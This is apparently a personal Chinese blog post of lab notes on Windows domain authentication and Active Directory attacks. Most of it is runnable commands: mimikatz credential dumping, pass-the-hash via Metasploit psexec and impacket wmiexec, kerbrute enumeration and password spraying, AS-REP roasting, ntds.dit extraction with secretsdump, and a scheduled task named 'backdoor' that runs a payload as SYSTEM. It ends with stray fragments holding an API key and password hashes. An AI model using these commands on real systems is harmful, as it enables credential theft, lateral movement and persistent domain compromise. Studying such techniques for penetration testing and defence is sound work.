---
layout: post
title: windows身份认证
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---



```java
密码是放在本机的数据库来验证的，但如果加入域的话，用户名和密码是放在域控制器去验证。
也就是说你的账号密码可以在同一域的任何一台计算机登录。
```

windows用户登录到域的时候，身份验证是采用Kerberos协议在域控制器上进行的，而登录到此计算机则是通过SAM（本机安全账户数据库）来验证的。

## Kerberos协议

是一种网络身份验证协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。

其特点是：用户只需输入一次身份验证信息就可以凭借此验证获得的票据访问多个服务，即SSO单点登录。

![image-20240107202340859](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107202340859.png)



## <1>哈希传递攻击

背景：渗透中获取不到明文的密码，破解不了NTLM Hash的MD4算法而又想横向渗透。

前提：可以获得靶机的NTLM Hash、用户名、能够访问其他的服务器。

```java
进行哈希传递说明我们已经控制了一台内网内的机器了，想扩大战果，试一试能否用 NTLM Hash登录其他机器，如果多台机器的密码都一样则会攻击成功。
```

利用msf的`exploit/windows/smb/psexeec`模块攻击

首先我们需要获得机器的NTLM Hash的值，利用mimikatz工具

```java
privilege::debug
sekurlsa::logonpasswords
```

![image-20240225225313445](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225313445.png)

```java
use exploit/windows/smb/psexec
show options

```

![image-20240225225427758](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225427758.png)

![image-20240225225851136](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225851136.png)

![image-20240225225909868](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225909868.png)



## <2>域内用户枚举

域内用户枚举，即爆破一下域内的账号名

```
kerbrute_windows_386.exe userenum --dc 10.10.10.10 -d de1ay.com user.txt
```

```java
10.10.10.10  //是DC的ip地址（域控）
de1ay.com  //是域的名字
user.txt   //枚举的账号名字
```

![image-20240226154527431](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226154527431.png)

![image-20240226154550660](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226154550660.png)

可知这几个用户是存在的

kerbrute进行错误枚举的原理就是kerberos有这样四种错误代码：

- KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）
- KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）
- KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）
- KDC_ERR_PREAUTH_FAILED (用户存在但密码错误)

注：如果某个用户勾选了 Kerberos预身份验证，则判断不出来，这个在后面AS-REP roasting攻击会讲到

## <3>密码喷洒攻击（用户密码枚举）

```java
kerbrute_windows_386.exe passwordspray --dc 192.168.16.10 -d hack.com user.txt 1qaz@WSX  # 适用于存在用户账户锁定策略
kerbrute_windows_386.exe bruteuser --dc 192.168.16.10 -d hack.com password.txt administrator
```

![image-20240226161017765](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161017765.png)

## <4>AS-REP Roasting攻击

#### （1）Roasting攻击简介

AS-REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式，是管理员的错误配置导致的。管理员在DC上 用户账户策略勾选了 不要求Kerberos预身份验证

`一直右击属性找到具体用户，然后右击即可找到`

**![image-20240226161605875](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161605875.png)**

![image-20240226161646499](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161646499.png)

### AS_REP Roasting攻击的首要条件：

- 勾选了默认不惜要Kerberos预身份验证

预身份验证：

我们没有勾选的情况下，通过kekeo申请票据，这里我们输入正确的账号密码才有AS-REP数据

打上勾之后，在AS—REQ阶段，只需要发个用户名即可不需要发送密码 也会有AS-REP数据

在AS-REP阶段，数据包中最外层的enc-part是用户密码hash加密的

![image-20240226162121905](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226162121905.png)

**原理**：

- 不需要Kerberos的域身份认证，AS_REP过程中可任意伪造用户名请求票据。通过爆破 enc-part得到获得用户hash，拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以通过hashcat对其破解，最终获得明文密码，构成了 AS-REP Roasting攻击





```java
copy C:\$SNAP_202402261928_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```



## 卷影拷贝提取ntds.dit

前言：因为域控制器中的C:\Windows\NTDS\ntds.dit文件即使是管理员也被禁止读取。

使用Windows本地卷影拷贝服务（volume Shadow Copy Server, VSS),就可以获取文件的副本（类似于虚拟机的快照）。

ntds.dit介绍

```java
是一个数据库，用于存储Active Directory数据，包括域中所有用户的密码哈希，是一个二进制文件，包含用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被操作系统锁定的。
    如果我们获得不就可以哈希传递攻击了嘛~
```

域环境内最重要的是那个文件如下：

```java
ntds.dit文件位置: C:\\Windows\\NTDS\\NTDS.dit
system文件位置：  C:\\Windows\\System32\\config\\SYSTEM
sam文件位置：   C:\\Windows\\System32\\config\\SAM
```

### 通过ntdsutil.exe 提取ntds.dit

ntdsutil是一个为活动目录提供管理机制的命令行工具，该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内主机在域控制器上远程操作。

#### 支持的操作系统

- Windows  Server 2003  /  2008  /2012

使用方法：就是在域控的命令行，创建一个快照，因为快照中包含Windows中的所有文件，并且复制快照中的任何文件都不会受到Windows锁定机制的限制。

##### 创建快照

```java
ntdsutil snapshot "activate instance ntds" create quit quit 
```

这里的二个quit是执行完后直接关闭的窗口。

![image-20240226213301693](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226213301693.png)

##### 挂载快照

``` 
ntdsutil snapshot "mount {}"  quit quit
```

![image-20240226213506533](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226213506533.png)

##### 复制ntds.dit

`这个需要管理员权限才可以复制`

```java
copy C:\$SNAP_202211280955_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```

##### 卸载快照

```java
ntdsutil snapshot "unmount {9368eb6a-631b-4e28-b25b-bc78b4674f49}" quit quit
```

##### 删除快照

```java
ntdsutil snapshot "delete {9368eb6a-631b-4e28-b25b-bc78b4674f49}" quit quit
```

最后复制出来的文件可以直接用记事本打开，获取到了ntds.dit文件，接下来就是如何解密这个文件。

![image-20240226214146941](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214146941.png)

### system.hive

最后还需要转储system.hive,system.hiv中存放这ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息：

```java
reg save hklm\system system.hive
```

同样也是需要管理员权限的，

![image-20240226214547693](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214547693.png)

## impacket工具包secretdump导出ntds.dit域内全部hash

```
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```

![image-20240226214636174](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214636174.png)



## 横向渗透工具使用

### IPC

**建立 ipc$ 连接的条件：**

- 目标主机开启了139和445端口
- 目标主机管理员开启了ipc$默认共享

1、建立IPC$空连接：

```java
net use \\10.10.10.80\ipc$ "password" /user:"username"
```

2、文件上传

```java
copy 盲注脚本.txt \\10.10.10.80\c$
```

![image-20240227124410048](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124410048.png)

![image-20240227124427425](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124427425.png)

3.映射路径：

 ```java
 net use z: \\10.10.10.80\c$ "1qaz@WSX" /user:"administrator"
 ```

![image-20240227124736559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124736559.png)

4、 查看时间

```java
net time \\10.10.10.80
```

5、定时任务（at是可以运行的）

```
C:\>at \\127.0.0.1 11:05 srv.exe 
用at命令启动srv.exe吧（） 
```

![image-20240227195323569](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227195323569.png)

删除计划任务

```java
at \\192.168.183.130 1/delete
//1为计划任务的ID
```

6、访问/删除路径：

```
net use z: \\127.0.0.1\c$   #直接访问
net use c: /del     删除映射的c盘，其他盘类推 
net use * /del      删除全部,会有提示要求按y确认
```

7.删除IPC$连接：

```
net use \\127.0.0.1\ipc$ /del
```

8、查看目标主机进程

```java
tasklist /S 192.168.183.130 /U administrator /P liu78963
```

#### 需要注意一点的是at命令在，windows server 2008后被废除了，用schtasks.exe代替了

### 利用schtasks 命令

1. 先与目标主机建立ipc连接。

2. 然后使用copy命令远程操作，将metasploit生成的payload文件shell.exe复制到目标系统C盘中。

3. 在目标主机DC上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。命令如下：

```java
schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
```

在没有建立ipc连接时，要加上/u和/p参数分别设置用户名和密码。

(这里建议加上 /u /p 不然会一直报错，拒绝访问)

```java
schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn backdoor /sc minute /mo 1  /tr whoami >C:\Users\c'x'k\Desktop\二队\result.txt /ru system /f
```

![image-20240227200833379](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227200833379.png)

`这里我直接这样 whoami是不对的，下文会提到这一点`

####  执行如下命令立即运行该计划任务

```java
schtasks /run /s 192.168.183.130 /i /tn backdoor
// i：忽略任何限制立即运行任务

schtasks /run /s 192.168.183.130 /i /tn backdoor /u administrator /p Liu78963   // 遇到上面所说的报错时执行加上/u和/p参数分别设置高权限用户名和密码
```

#### 强制删除该计划任务

```java
schtasks /delete /s 10.10.10.80 /tn "backdoor" /f
```

·正确的利用schtasks计划任务直接执行系统命令，由于不回回显，我们需要将执行的结果写到一个文本文件中，

```java
schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn test /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c 'whoami > C:\Users\c'x'k\Desktop\二队\result.txt'" /ru system /f

C:\Users\c'x'k>schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn test2 /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c 'whoami > C:\JYcxk.txt'" /ru system /f
成功: 成功创建计划任务 "test2"。

C:\Users\c'x'k>schtasks /run /s 10.10.10.80 /i /tn test2
错误: 拒绝访问。

C:\Users\c'x'k>schtasks /run /s 10.10.10.80 /u administrator /p 1qaz@WSX /i /tn test2
成功: 尝试运行 "test2"。
```

![image-20240227201941362](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227201941362.png)

这里本机是windows主机，控制的是我的虚拟机（结果是出现在被控制的主机上）

![image-20240227202035935](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202035935.png)

#### 最后利用type 命令远程查看目标主机上的result.txt文件即可

```java
type \\10.10.10.80\c$\JYcxk.txt
```

![image-20240227202223628](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202223628.png)



### msf下的PsExec模块

![image-20240227202826058](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202826058.png)

常用的模块有：

```java
exploit/windows/smb/psexec           // 用psexec执行系统命令,与psexec.exe相同
exploit/windows/smb/psexec_psh       // 使用powershell作为payload(PsExec的PowerShell版本)
auxiliary/admin/smb/psexec_command   // 在目标机器上执行系统命令
exploit/windows/smb/ms17_010_psexec
```

```java
psexec_psh主要是由powershell实现的免杀效果优于psexec
但是Windows 7、Windows Server 2008及以上版本的操作系统才默认有powershell
```

```java
set rhosts 192.168.52.138
set SMBDomain god
set SMBUser Liukaifeng01
set SMBPass Liufupeng123       // 设置明文密码或设置哈希来进行PTH
run
```

其他的那几个模块的使用方法与exploit/windows/smb/psexec相同。这些模块不仅可以指定用户明文密码，还可以直接指定哈希值来进行哈希传递攻击。

**注意：在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。**

### 利用WMI来横向渗透

WMI的全名为 "Windows Management Instrumentation"。WMI是由一系列工具集成的，可以通过/node选项使用端口135上的远程过程调用（PRC）进行通信以进行 远程 访问，允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。

```java
因为psexec在内网中被严格监控，被很多厂商加入了黑名单，而WMI默认不回将操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。
```

注意：使用WMIC连接远程主机，需要目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，而 wimcexec 使⽤445端⼝传回显)

```java
wmic /node:10.10.10.80 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
// wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
```

#### 查询远程进程信息

```java
wmic /node:10.10.10.80 /user:administrator /password:1qaz@WSX process list brief
```

![image-20240227204814224](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227204814224.png)

#### 远程创建进程

```java
wmic /node:10.10.10.80 /user:administrator /password:1qaz@WSX process call create "cmd.exe /c ipconfig > C:\result.txt"

wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "cmd.exe /c <命令> > C:\result.txt"

wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "目录\backdoor.exe"

// /node：指定将对其进行操作的服务器
type \\192.168.52.138\c$\result.txt
```

![image-20240227205955665](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227205955665.png)

### WMIEXEC

该脚本主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。

本地复现失败

![image-20240227213842195](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213842195.png)

![image-20240227213824565](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213824565.png)

#### 2.通过wmiexec对WMI进行PTH

PTH攻击除了通过SMB进行以外，还可以使用WMI进行。下面我们使用Impacket中的wmiexec进行PTH攻击。

在kali下载好Impacket后，执行

python3 wmiexec.py -hashes 00000000000000000000000000000000:3766c17d09689c438a072a33270cb6f5 test.com/Administrator@192.168.1.2，执行结果如图1-5所示。

![image-20240227213756264](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213756264.png)

![image-20240227213659445](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213659445.png)





```java
<item>
<apikey>cc6f97fbc2931e8118e6057aa7421177</apikey>
</item>
```

```java
<item>
<USR>admin</USR>
<NAME/>
<PWD>3b62ac676e640aff413dbbe602337cdfc7fc2497</PWD>
<EMAIL>admin@qq.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE>Asia/Shanghai</TIMEZONE>
<LANG>en_US</LANG>
</item>
```



```java
admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c
```



